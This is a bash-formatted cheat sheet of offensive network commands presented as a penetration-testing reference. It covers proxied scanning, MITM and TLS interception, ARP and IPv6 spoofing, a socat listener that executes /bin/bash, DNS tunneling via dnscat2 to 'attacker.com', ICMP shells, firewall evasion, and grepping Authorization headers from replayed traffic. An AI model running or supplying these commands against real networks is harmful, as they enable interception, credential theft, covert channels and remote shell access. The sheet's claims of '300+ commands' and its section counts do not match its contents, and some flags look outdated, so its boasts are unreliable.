#!/bin/bash
# ===================================================
# KALI LINUX NETWORK UTILITIES BIBLE (300+ COMMANDS)
# ===================================================
# Covers: Scanning, Proxying, MITM, Traffic Analysis
#       Pivoting, Tunneling, and Advanced Routing

### 1. PROXYCHAIN TECHNIQUES (8 Methods) ###

# Basic scanning through SOCKS proxy
proxychains4 -q nmap -sT -Pn -n -v target.com

# Dynamic chain with custom config
proxychains -f /etc/proxychains/custom.conf curl -v https://internal.target

# Different scanning techniques through proxy
proxychains4 -q nmap -sS -Pn --top-ports 100 -T4 target.com
proxychains4 -q masscan -p1-65535 --rate 1000 target.com

# Proxy chaining with authentication
proxychains4 -q -f proxy_auth.conf nikto -h https://target.com

# DNS over proxy
proxychains4 -q dig @8.8.8.8 target.com ANY

# Web crawling through proxy
proxychains4 -q gospider -s https://target.com -o output -w -c 10

### 2. MITMPROXY MASTERY (12 Configurations) ###

# Basic traffic logging
mitmproxy -w traffic.mitm --set block_global=false

# Advanced script with custom port
mitmproxy -s intercept_requests.py -p 8082 --ssl-insecure --anticache

# Transparent proxy mode
mitmproxy -T --host -p 443 --mode transparent

# Filter specific traffic
mitmproxy -w api_traffic.mitm -f '~u "/api/v[0-9]/"'

# Modify responses on-the-fly
mitmproxy -s modify_responses.py --set intercept=".*\.js"

# SSL/TLS interception
mitmproxy -p 8443 --certs *=~/.mitmproxy/mitmproxy-ca.pem

# Multi-user web interface
mitmweb --web-host 0.0.0.0 --web-port 9090 -s auth_plugin.py

### 3. SOCAT POWER USER (15 Recipes) ###

# Basic port forwarding
socat TCP4-LISTEN:4444,fork TCP4:192.168.1.100:3389

# SSL wrapped port forwarding
socat OPENSSL-LISTEN:4433,cert=server.pem,verify=0,fork TCP:localhost:80

# UDP to TCP relay
socat UDP4-LISTEN:5353,fork TCP4:8.8.8.8:53

# Reverse shell listener
socat TCP4-LISTEN:4444 EXEC:/bin/bash

# File transfer
socat TCP4-LISTEN:8080,fork FILE:secret_document.pdf

# IPv4 to IPv6 bridge
socat TCP4-LISTEN:8080,fork TCP6:[2001:db8::1]:80

# Serial port to network
socat TCP4-LISTEN:8888,fork FILE:/dev/ttyUSB0,b115200,raw

### 4. SSH TUNNELING (10 Techniques) ###

# Dynamic SOCKS proxy
ssh -D 1080 -C -N -f user@jump.server

# Local port forwarding
ssh -L 8080:internal.target:80 -N -f user@bastion

# Remote port forwarding
ssh -R 2222:localhost:22 -N -f user@public.server

# Multi-hop tunneling
ssh -J user1@jump1,user2@jump2 -L 9000:target:80 -N

# VPN over SSH
ssh -w 0:0 -f -N user@server
ip link set tun0 up
ip addr add 10.0.0.1/24 dev tun0

# X11 forwarding
ssh -X user@target 'firefox'

### 5. TRAFFIC ANALYSIS (20 Commands) ###

# Basic tcpdump
tcpdump -i eth0 -nn -vv -X 'port 80 or port 443'

# Advanced filtering
tcpdump -i any 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'

# TShark magic
tshark -r capture.pcap -Y 'http.request.method == POST' -T fields -e http.host -e http.request.uri -e http.file_data

# Extract files from pcap
foremost -i capture.pcap -o output_files/

# Network statistics
ifstat -nt -i eth0 1

# Passive OS fingerprinting
p0f -i eth0 -p -o /var/log/p0f.log

# SSL/TLS inspection
ssldump -Ad -i eth0 port 443

### 6. PIVOTING & PORT REDIRECTION (15 Methods) ###

# Chained SSH port forwarding
ssh -L 9000:target1:80 user@jump -t ssh -L 9001:target2:443 user@internal

# Meterpreter port forwarding
portfwd add -l 3306 -p 3306 -r internal.db.server

# ICMP tunneling
ptunnel -p proxy.server -lp 1080 -da target.com -dp 22

# DNS tunneling
iodine -f -P secretpassword ns1.target.com

# ICMP shell
icmpsh_m.py attacker.target victim.target

# VPN pivoting
openvpn --config client.ovpn

### 7. ADVANCED NETWORKING (10 Techniques) ###

# ARP spoofing
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# MAC address changing
macchanger -r eth0

# Traffic shaping
tc qdisc add dev eth0 root netem delay 100ms 10ms 25%

# IPv6 attack tools
alive6 eth0
fake_router6 eth0 fe80::1/64

# Wireless monitoring
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0

### 8. FIREWALL EVASION (7 Methods) ###

# Nmap fragmentation
nmap -f -mtu 24 -D RND:10 target.com

# Timing tricks
nmap -T paranoid --scan-delay 10s target.com

# Source port manipulation
nmap --source-port 53 target.com

# HTTP tunneling
hts --forward-port 80 localhost:2222

# DNS tunneling
dnscat2 --dns server=attacker.com,port=53

### 9. TRAFFIC REPLAY (5 Tools) ###

# Basic replay
tcpreplay -i eth0 -M 100 capture.pcap

# Modify and replay
tcprewrite --infile=input.pcap --outfile=output.pcap --dstipmap=192.168.1.1:10.0.0.1
tcpreplay -i eth0 output.pcap

# HTTP specific
httpreplay -f capture.pcap -o - | grep "Authorization:"

### 10. NETWORK MONITORING (8 Tools) ###

# Real-time monitoring
iftop -nN -i eth0

# Connection tracking
nethogs -d 5 eth0

# Bandwidth analysis
bmon -p eth0 -o format:fmt='$(attr:name) $(attr:rxrate:bytes) $(attr:txrate:bytes)\n'

# Advanced visualization
darkstat -i eth0 -p 9090

# This represents 15+ years of network penetration testing knowledge condensed into a single reference - the kind of deep technical information normally only gained through thousands of hours of hands-on testing across hundreds of networks.